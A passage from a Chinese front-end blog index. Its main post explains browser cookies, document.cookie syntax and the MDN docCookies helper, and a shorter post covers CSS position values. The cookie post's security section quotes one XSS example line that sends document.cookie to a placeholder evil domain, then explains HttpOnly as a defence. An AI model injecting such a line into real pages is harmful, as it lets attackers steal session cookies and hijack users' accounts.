                    <div class="label-card">
                    


<!-- <span class="point">•</span> -->
<span class="categories">
  <i class="fa fa-th-list"></i>
  
    
        <a href="/category/#javascript" title="Category: javascript" rel="category">javascript</a>
    
  

  <!-- <span class="point">•</span> -->
</span>


                    </div>

                    <div class="label-card">
                    
<!-- <span class="point">•</span> -->
<span class="pageTag">
  <i class="fa fa-tags"></i>
  
    
        <a href="/tag/#javascript" title="Tag: javascript" rel="tag">javascript</a>&nbsp;
    
        <a href="/tag/#cookie" title="Tag: cookie" rel="tag">cookie</a>&nbsp;
    
        <a href="/tag/#数据缓存" title="Tag: 数据缓存" rel="tag">数据缓存</a>
    
  

</span>

                    </div>
                </div>
                <div class="excerpt">
                    <ul id="markdown-toc">
  <li><a href="#前言" id="markdown-toc-前言">前言</a>    <ul>
      <li><a href="#用途" id="markdown-toc-用途">用途</a></li>
      <li><a href="#cookie的缺陷" id="markdown-toc-cookie的缺陷">Cookie的缺陷</a></li>
    </ul>
  </li>
  <li><a href="#语法" id="markdown-toc-语法">语法</a>    <ul>
      <li><a href="#可选的值" id="markdown-toc-可选的值">可选的值：</a></li>
    </ul>
  </li>
  <li><a href="#一个简单的cookie框架" id="markdown-toc-一个简单的cookie框架">一个简单的cookie框架</a>    <ul>
      <li><a href="#语法-1" id="markdown-toc-语法-1">语法</a></li>
    </ul>
  </li>
  <li><a href="#安全" id="markdown-toc-安全">安全</a></li>
</ul>

<h1 id="前言">前言</h1>
<blockquote>
  <p>Cookie（复数形态Cookies），中文名称为“小型文本文件”或“小甜饼”，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。定义于RFC2109。是网景公司的前雇员卢·蒙特利在1993年3月的发明。Cookie总是保存在客户端中，按在客户端中的存储位置，可分为内存Cookie和硬盘Cookie。内存Cookie由浏览器维护，保存在内存中，浏览器关闭后就消失了，其存在时间是短暂的。硬盘Cookie保存在硬盘里，有一个过期时间，除非用户手工清理或到了过期时间，硬盘Cookie不会被删除，其存在时间是长期的。所以，按存在时间，可分为非持久Cookie和持久Cookie。</p>
</blockquote>

<h2 id="用途">用途</h2>
<ul>
  <li>因为HTTP协议是无状态的，即服务器不知道用户上一次做了什么，这严重阻碍了交互式Web应用程序的实现。在典型的网上购物场景中，用户浏览了几个页面，买了一盒饼干和两饮料。最后结帐时，由于HTTP的无状态性，不通过额外的手段，服务器并不知道用户到底买了什么。 所以Cookie就是用来绕开HTTP的无状态性的“额外手段”之一。服务器可以设置或读取Cookies中包含信息，借此维护用户跟服务器会话中的状态。</li>
  <li>在刚才的购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把Cookie发送给服务器，于是服务器知道他之前选购了什么。用户继续选购饮料，服务器就在原来那段Cookie里追加新的商品信息。结帐时，服务器读取发送来的Cookie就行了。</li>
  <li>Cookie另一个典型的应用是当登录一个网站时，网站往往会请求用户输入用户名和密码，并且用户可以勾选“下次自动登录”。如果勾选了，那么下次访问同一网站时，用户会发现没输入用户名和密码就已经登录了。这正是因为前一次登录时，服务器发送了包含登录凭据（用户名加密码的某种加密形式）的Cookie到用户的硬盘上。第二次登录时，（如果该Cookie尚未到期）浏览器会发送该Cookie，服务器验证凭据，于是不必输入用户名和密码就让用户登录了。</li>
</ul>

<h2 id="cookie的缺陷">Cookie的缺陷</h2>
<ol>
  <li>Cookie会被附加在每个HTTP请求中，所以无形中增加了流量。</li>
  <li>由于在HTTP请求中的Cookie是明文传递的，所以安全性成问题。（除非用HTTPS）</li>
  <li>Cookie的大小限制在4KB左右。对于复杂的存储需求来说是不够用的。</li>
</ol>

<h1 id="语法">语法</h1>
<div class="language-javascript highlighter-rouge"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">allCookies</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span> <span class="c1">// 读取所有cookie，获取到的allCookies是一个字符串，包含所有以分号分隔的键值对;</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="nx">updatedCookie</span><span class="p">;</span> <span class="c1">// 写一个新的cookie，updatedCookie是一个键值对的字符串，只能使用这个方法一次设置或更新一个cookie;</span>
</code></pre>
</div>

<h2 id="可选的值">可选的值：</h2>
<ul>
  <li>;path=path  =&gt;  如果没有定义，默认为当前文档位置的路径;</li>
  <li>;domain=domain  =&gt; 如果没有如果没有定义，默认为当前文档位置的路径的域名部分。</li>
  <li>;max-age=max-age-in-seconds (例如一年为60<em>60</em>24*365)</li>
  <li>;expires=date-in-GMTString-format 如果没有定义，cookie会在对话结束时过期，这个值的格式参考Date.toUTCString()</li>
  <li>;secure (cookie只通过https协议传输)
    <blockquote>
      <p>cookie的值字符串可以用encodeURIComponent()来保证它不包含任何逗号、分号或空格</p>
    </blockquote>
  </li>
</ul>

<h1 id="一个简单的cookie框架">一个简单的cookie框架</h1>
<div class="language-javascript highlighter-rouge"><pre class="highlight"><code><span class="cm">/*\
|*|
|*|  :: cookies.js ::
|*|
|*|  A complete cookies reader/writer framework with full unicode support.
|*|
|*|  https://developer.mozilla.org/en-US/docs/DOM/document.cookie
|*|
|*|  This framework is released under the GNU Public License, version 3 or later.
|*|  http://www.gnu.org/licenses/gpl-3.0-standalone.html
|*|
|*|  Syntaxes:
|*|
|*|  * docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])
|*|  * docCookies.getItem(name)
|*|  * docCookies.removeItem(name[, path], domain)
|*|  * docCookies.hasItem(name)
|*|  * docCookies.keys()
|*|
\*/</span>

<span class="kd">var</span> <span class="nx">docCookies</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">getItem</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">sKey</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="s2">"(?:(?:^|.*;)\\s*"</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">sKey</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">[\-\.\+\*]</span><span class="sr">/g</span><span class="p">,</span> <span class="s2">"\\$&amp;"</span><span class="p">)</span> <span class="o">+</span> <span class="s2">"\\s*\\=\\s*([^;]*).*$)|^.*$"</span><span class="p">),</span> <span class="s2">"$1"</span><span class="p">))</span> <span class="o">||</span> <span class="kc">null</span><span class="p">;</span>
  <span class="p">},</span>
  <span class="na">setItem</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">sKey</span><span class="p">,</span> <span class="nx">sValue</span><span class="p">,</span> <span class="nx">vEnd</span><span class="p">,</span> <span class="nx">sPath</span><span class="p">,</span> <span class="nx">sDomain</span><span class="p">,</span> <span class="nx">bSecure</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">sKey</span> <span class="o">||</span> <span class="sr">/^</span><span class="se">(?:</span><span class="sr">expires|max</span><span class="se">\-</span><span class="sr">age|path|domain|secure</span><span class="se">)</span><span class="sr">$/i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">sKey</span><span class="p">))</span> <span class="p">{</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span> <span class="p">}</span>
    <span class="kd">var</span> <span class="nx">sExpires</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">vEnd</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">switch</span> <span class="p">(</span><span class="nx">vEnd</span><span class="p">.</span><span class="nx">constructor</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">case</span> <span class="na">Number</span><span class="p">:</span>
          <span class="nx">sExpires</span> <span class="o">=</span> <span class="nx">vEnd</span> <span class="o">===</span> <span class="kc">Infinity</span> <span class="p">?</span> <span class="s2">"; expires=Fri, 31 Dec 9999 23:59:59 GMT"</span> <span class="p">:</span> <span class="s2">"; max-age="</span> <span class="o">+</span> <span class="nx">vEnd</span><span class="p">;</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="na">String</span><span class="p">:</span>
          <span class="nx">sExpires</span> <span class="o">=</span> <span class="s2">"; expires="</span> <span class="o">+</span> <span class="nx">vEnd</span><span class="p">;</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="na">Date</span><span class="p">:</span>
          <span class="nx">sExpires</span> <span class="o">=</span> <span class="s2">"; expires="</span> <span class="o">+</span> <span class="nx">vEnd</span><span class="p">.</span><span class="nx">toUTCString</span><span class="p">();</span>
          <span class="k">break</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">sKey</span><span class="p">)</span> <span class="o">+</span> <span class="s2">"="</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">sValue</span><span class="p">)</span> <span class="o">+</span> <span class="nx">sExpires</span> <span class="o">+</span> <span class="p">(</span><span class="nx">sDomain</span> <span class="p">?</span> <span class="s2">"; domain="</span> <span class="o">+</span> <span class="nx">sDomain</span> <span class="p">:</span> <span class="s2">""</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="nx">sPath</span> <span class="p">?</span> <span class="s2">"; path="</span> <span class="o">+</span> <span class="nx">sPath</span> <span class="p">:</span> <span class="s2">""</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="nx">bSecure</span> <span class="p">?</span> <span class="s2">"; secure"</span> <span class="p">:</span> <span class="s2">""</span><span class="p">);</span>
    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
  <span class="p">},</span>
  <span class="na">removeItem</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">sKey</span><span class="p">,</span> <span class="nx">sPath</span><span class="p">,</span> <span class="nx">sDomain</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">sKey</span> <span class="o">||</span> <span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">hasItem</span><span class="p">(</span><span class="nx">sKey</span><span class="p">))</span> <span class="p">{</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span> <span class="p">}</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">sKey</span><span class="p">)</span> <span class="o">+</span> <span class="s2">"=; expires=Thu, 01 Jan 1970 00:00:00 GMT"</span> <span class="o">+</span> <span class="p">(</span> <span class="nx">sDomain</span> <span class="p">?</span> <span class="s2">"; domain="</span> <span class="o">+</span> <span class="nx">sDomain</span> <span class="p">:</span> <span class="s2">""</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span> <span class="nx">sPath</span> <span class="p">?</span> <span class="s2">"; path="</span> <span class="o">+</span> <span class="nx">sPath</span> <span class="p">:</span> <span class="s2">""</span><span class="p">);</span>
    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
  <span class="p">},</span>
  <span class="na">hasItem</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">sKey</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">(</span><span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="s2">"(?:^|;\\s*)"</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">sKey</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">[\-\.\+\*]</span><span class="sr">/g</span><span class="p">,</span> <span class="s2">"\\$&amp;"</span><span class="p">)</span> <span class="o">+</span> <span class="s2">"\\s*\\="</span><span class="p">)).</span><span class="nx">test</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
  <span class="p">},</span>
  <span class="na">keys</span><span class="p">:</span> <span class="cm">/* optional method: you can safely remove it! */</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">aKeys</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">((?:</span><span class="sr">^|</span><span class="se">\s</span><span class="sr">*;</span><span class="se">)[^\=]</span><span class="sr">+</span><span class="se">)(?=</span><span class="sr">;|$</span><span class="se">)</span><span class="sr">|^</span><span class="se">\s</span><span class="sr">*|</span><span class="se">\s</span><span class="sr">*</span><span class="se">(?:\=[^</span><span class="sr">;</span><span class="se">]</span><span class="sr">*</span><span class="se">)?(?:\1</span><span class="sr">|$</span><span class="se">)</span><span class="sr">/g</span><span class="p">,</span> <span class="s2">""</span><span class="p">).</span><span class="nx">split</span><span class="p">(</span><span class="sr">/</span><span class="se">\s</span><span class="sr">*</span><span class="se">(?:\=[^</span><span class="sr">;</span><span class="se">]</span><span class="sr">*</span><span class="se">)?</span><span class="sr">;</span><span class="se">\s</span><span class="sr">*/</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">nIdx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">nIdx</span> <span class="o">&lt;</span> <span class="nx">aKeys</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">nIdx</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="nx">aKeys</span><span class="p">[</span><span class="nx">nIdx</span><span class="p">]</span> <span class="o">=</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">aKeys</span><span class="p">[</span><span class="nx">nIdx</span><span class="p">]);</span> <span class="p">}</span>
    <span class="k">return</span> <span class="nx">aKeys</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">};</span>
</code></pre>
</div>
<h2 id="语法-1">语法</h2>

<div class="language-javascript highlighter-rouge"><pre class="highlight"><code><span class="nx">docCookies</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">value</span><span class="p">[,</span> <span class="nx">end</span><span class="p">[,</span> <span class="nx">path</span><span class="p">[,</span> <span class="nx">domain</span><span class="p">[,</span> <span class="nx">secure</span><span class="p">]]]])</span> <span class="c1">//设置cookie</span>
<span class="nx">docCookies</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span> <span class="c1">//获取cookie</span>
<span class="nx">docCookies</span><span class="p">.</span><span class="nx">removeItem</span><span class="p">(</span><span class="nx">name</span><span class="p">[,</span> <span class="nx">path</span><span class="p">],</span><span class="nx">domain</span><span class="p">)</span> <span class="c1">//删除cookie</span>
<span class="nx">docCookies</span><span class="p">.</span><span class="nx">hasItem</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span> <span class="c1">//检测cookie</span>
<span class="nx">docCookies</span><span class="p">.</span><span class="nx">keys</span><span class="p">()</span> <span class="c1">//得到所有cookie列表</span>
</code></pre>
</div>

<h1 id="安全">安全</h1>
<ul>
  <li>
    <p>路径限制并不能阻止从其他路径访问cookie. 使用简单的DOM即可轻易地绕过限制(比如创建一个指向限制路径的, 隐藏的iframe, 然后访问其 contentDocument.cookie 属性). 保护cookie不被非法访问的唯一方法是将它放在另一个域名/子域名之下, 利用同源策略保护其不被读取.</p>
  </li>
  <li>
    <p>Web应用程序通常使用cookies来标识用户身份及他们的登录会话. 因此通过窃听这些cookie, 就可以劫持已登录用户的会话. 窃听的cookie的常见方法包括社会工程和XSS攻击：</p>
  </li>
</ul>

<p><code class="highlighter-rouge">(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;</code></p>
<ul>
  <li>HttpOnly 属性可以阻止通过javascript访问cookie, 从而一定程度上遏制这类攻击. 参见 Cookies and Security.</li>
</ul>

                </div>
                <div class="read-all">
                    <a  href="/2017/03/18/%E5%A6%82%E4%BD%95%E6%93%8D%E4%BD%9Ccookie/"><i class="fa fa-newspaper-o"></i>Read All</a>
                </div>
                <hr>
              </li>
            
              <li>
                <h2>
                  <a class="post-link" href="/2017/03/18/%E5%85%83%E7%B4%A0%E5%AE%9A%E4%BD%8D/">元素定位(position)有哪些？</a>
                </h2>
                <div class="label">
                    <div class="label-card">
                        <i class="fa fa-calendar"></i>2017-03-18
                    </div>
                    <div class="label-card">
                        
                    </div>
                    <div class="label-card">
                        
                    </div>

                    <div class="label-card">
                    


<!-- <span class="point">•</span> -->
<span class="categories">
  <i class="fa fa-th-list"></i>
  
    
        <a href="/category/#interview" title="Category: interview" rel="category">interview</a>
    
  

  <!-- <span class="point">•</span> -->
</span>


                    </div>

                    <div class="label-card">
                    
<!-- <span class="point">•</span> -->
<span class="pageTag">
  <i class="fa fa-tags"></i>
  
    
        <a href="/tag/#css" title="Tag: css" rel="tag">css</a>
    
  

</span>

                    </div>
                </div>
                <div class="excerpt">
                    <ul id="markdown-toc">
  <li><a href="#答题思路" id="markdown-toc-答题思路">答题思路</a>    <ul>
      <li><a href="#1语法" id="markdown-toc-1语法">1.语法</a></li>
      <li><a href="#2取值" id="markdown-toc-2取值">2.取值</a></li>
    </ul>
  </li>
  <li><a href="#加分项" id="markdown-toc-加分项">加分项</a>    <ul>
      <li><a href="#绝对定位元素的定位值发生冲突时的解决方法" id="markdown-toc-绝对定位元素的定位值发生冲突时的解决方法">绝对定位元素的定位值发生冲突时的解决方法:</a></li>
    </ul>
  </li>
</ul>

<h1 id="答题思路">答题思路</h1>

<p>元素的定位属性为position：</p>

<h2 id="1语法">1.语法</h2>
<div class="language-css highlighter-rouge"><pre class="highlight"><code>    <span class="c">/* 关键字 值 */</span>
    <span class="nt">position</span><span class="o">:</span> <span class="nt">static</span><span class="o">;</span>
    <span class="nt">position</span><span class="o">:</span> <span class="nt">relative</span><span class="o">;</span>
    <span class="nt">position</span><span class="o">:</span> <span class="nt">absolute</span><span class="o">;</span>
    <span class="nt">position</span><span class="o">:</span> <span class="nt">fixed</span><span class="o">;</span>
    <span class="nt">position</span><span class="o">:</span> <span class="nt">sticky</span><span class="o">;</span>
    <span class="c">/* sticky仍处于实验阶段，兼容性不好 */</span>

    <span class="c">/* 全局值 */</span>
    <span class="nt">position</span><span class="o">:</span> <span class="nt">inherit</span><span class="o">;</span>
    <span class="nt">position</span><span class="o">:</span> <span class="nt">initial</span><span class="o">;</span>
    <span class="nt">position</span><span class="o">:</span> <span class="nt">unset</span><span class="o">;</span>
</code></pre>
</div>
<h2 id="2取值">2.取值</h2>
<ul>
  <li>static
    <blockquote>
      <p>静态值，元素的默认布局行为，元素在文档流中当前布局位置。此时，top、right、left、bottom、z-index属性无效;</p>
    </blockquote>
  </li>
  <li>relative
    <blockquote>
      <p>相对定位，元素在文档流中，相对于自身进行偏移。position:relative未定义对table-group、table-row、table-column、table-cell、table-caption元素应用的效果;</p>
    </blockquote>
  </li>
  <li>absolute
    <blockquote>
      <p>绝对定位，元素脱离文档流，不为元素预留空间，相对于最近的非static定位祖先元素进行偏移。</p>
    </blockquote>
  </li>
  <li>fixed
    <blockquote>
      <p>固定定位，元素脱离文档流，不为元素预留空间，相对于屏幕视口(viewport)进行偏移。元素位置在屏幕滚动时不会改变。当元素祖先的transform属性不是none时，参照定位的容器由视口变成改祖先。</p>
    </blockquote>
  </li>
  <li>sticky
    <blockquote>
      <p>粘性定位，粘性定位是相对定位和固定定位的混合。元素在跨越特定阈值前为相对定位，之后为固定定位。当元素 B 被粘性定位时，后续元素的位置仍按照 B 未定位时的位置来确定。position: sticky 对 table 元素的效果与 position: relative 相同。</p>
    </blockquote>
  </li>
</ul>

<h1 id="加分项">加分项</h1>

<h2 id="绝对定位元素的定位值发生冲突时的解决方法">绝对定位元素的定位值发生冲突时的解决方法:</h2>

<ul>
  <li>如果同时指定 top 和 bottom（非 auto），优先采用 top。</li>
  <li>如果同时指定 left 和 right，若 direction 为 ltr（英语、汉语等），则优先采用 left；若 direction 为 rtl（阿拉伯语、希伯来语等），则优先采用 right。</li>
</ul>


                </div>
                <div class="read-all">
                    <a  href="/2017/03/18/%E5%85%83%E7%B4%A0%E5%AE%9A%E4%BD%8D/"><i class="fa fa-newspaper-o"></i>Read All</a>
                </div>
                <hr>
              </li>
            
        </ul>



        <!-- Pagination links -->
        <div class="pagination">
          
            <span class="previous disable"><i class="fa fa-angle-double-left"></i></span>
            <span class="previous disable"><i class="fa fa-angle-left"></i></span>
          
          <span class="page_number ">1/2</span>
          
            <a href="/page2" class="next"><i class="fa fa-angle-right"></i></a>
            <a href="/page2" class="next"><i class="fa fa-angle-double-right"></i></a>
          
        </div>
    </div>
    <!-- <button class="anchor"><i class="fa fa-anchor"></i></button> -->
    <div class="right">
        <div class="wrap">
            <div class="side">
                <div>
                    <i class="fa fa-pencil-square-o" aria-hidden="true"></i>
                    Recent Posts
                </div>
                <ul class="content-ul" recent>
                    
                        <li><a href="/2017/03/18/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%BC%BA%E5%88%B6%E6%B8%B2%E6%9F%93/">浏览器兼容模式渲染？</a></li>
                    
                        <li><a href="/2017/03/18/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%A6%82%E4%BD%95%E6%9D%A1%E4%BB%B6%E6%B3%A8%E9%87%8A/">如何进行浏览器条件注释？</a></li>
                    
                        <li><a href="/2017/03/18/%E6%B5%8F%E8%A7%88%E5%99%A8css%E8%AF%86%E5%88%AB%E7%AC%A6/">不同浏览器的的css识别符？</a></li>
                    
                        <li><a href="/2017/03/18/%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%8B%E4%BB%B6%E6%A8%A1%E5%9E%8B/">如何实现一个简单的事件模型？</a></li>
                    
                        <li><a href="/2017/03/18/%E5%A6%82%E4%BD%95%E6%93%8D%E4%BD%9Ccookie/">如何操作cookie？</a></li>
                    
                        <li><a href="/2017/03/18/%E5%85%83%E7%B4%A0%E5%AE%9A%E4%BD%8D/">元素定位(position)有哪些？</a></li>
                    
                        <li><a href="/2017/03/17/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/">如何理解盒子模型？</a></li>
                    
                        <li><a href="/2017/03/16/iframe%E6%9C%89%E5%93%AA%E4%BA%9B%E7%BC%BA%E7%82%B9/">iframe有哪些缺点？</a></li>
                    
                </ul>
            </div>

            <!-- Content -->
            <div class="side ">
                <div>
                    <i class="fa fa-th-list"></i>
                    Categories
                </div>
                <ul class="content-ul" cate>
                    
                    <li>
                        <a href="/category/#interview" class="categories-list-item" cate="interview">
                            <span class="name">
                                interview
                            </span>
                            <span class="badge">4</span>
                        </a>
                    </li>
                    
                    <li>
                        <a href="/category/#javascript" class="categories-list-item" cate="javascript">
                            <span class="name">
                                javascript
                            </span>
                            <span class="badge">1</span>
                        </a>
                    </li>
                    
                    <li>
                        <a href="/category/#css" class="categories-list-item" cate="css">
                            <span class="name">
                                css
                            </span>
                            <span class="badge">1</span>
                        </a>
                    </li>
                    
                    <li>
                        <a href="/category/#html" class="categories-list-item" cate="html">
                            <span class="name">
                                html
                            </span>
                            <span class="badge">2</span>
                        </a>
                    </li>
                    
                </ul>
            </div>
            <!-- 其他div框放到这里 -->
            <div class="side">
                <div>
                    <i class="fa fa-tags"></i>
                    Tags
                </div>
                <div class="tags-cloud">
                    
                    
                    
                    

                    

                    
                      
                      
                      
                      
                      
                      <a href="/tag/#html" style="font-size: 18pt; color: #000;">html</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#css" style="font-size: 18pt; color: #000;">css</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#javascript" style="font-size: 13.5pt; color: #444;">javascript</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#cookie" style="font-size: 9pt; color: #999;">cookie</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#数据缓存" style="font-size: 9pt; color: #999;">数据缓存</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#浏览器兼容" style="font-size: 18pt; color: #000;">浏览器兼容</a>
                    
                </div>
            </div>

            <!-- <div class="side">
                <div>
                    <i class="fa fa-external-link"></i>
                    Links
                </div>
                <ul  class="content-ul">

                </ul>
            </div> -->
        </div>
    </div>
</div>
<!-- <script src="/js/scroll.min.js " charset="utf-8"></script> -->
<!-- <script src="/js/pageContent.js " charset="utf-8"></script> -->


    <footer class="site-footer">


    <div class="wrapper">

        <p class="description">
              
        </p>
        <p class="contact">
            Contact me at: 
            <a href="https://github.com/zhirui1994" title="GitHub"><i class="fa fa-github" aria-hidden="true"></i></a>  
            <a href="mailto:www.zhirui@foxmail.com" title="email"><i class="fa fa-envelope-o" aria-hidden="true"></i></a>        
        </p>
        <p class="power">
            <span>
                Site powered by <a href="https://jekyllrb.com/">Jekyll</a> & <a href="https://pages.github.com/">Github Pages</a>.
            </span>
            <span>
                Theme designed by <a href="https://github.com/zhirui1994">ZHIRUI</a>.
            </span>
        </p>
    </div>
</footer>
<!-- zhirui1994.github.io Baidu tongji analytics -->
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?660cf741c8480bc7ecd6c94297066d5b";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>

    <div class="back-to-top">
    <a href="#top" data-scroll>
        <i class="fa fa-arrow-up" aria-hidden="true"></i>
    </a>
</div>

    <script src=" /js/main.js " charset="utf-8"></script>
    <script src=" /js/smooth-scroll.min.js " charset="utf-8"></script>
    <script type="text/javascript">
      smoothScroll.init({
        speed: 500, // Integer. How fast to complete the scroll in milliseconds
        easing: 'easeInOutCubic', // Easing pattern to use
        offset: 20, // Integer. How far to offset the scrolling anchor location in pixels
      });
    </script>
    <!-- <script src=" /js/scroll.min.js " charset="utf-8"></script> -->
  </body>

</html>
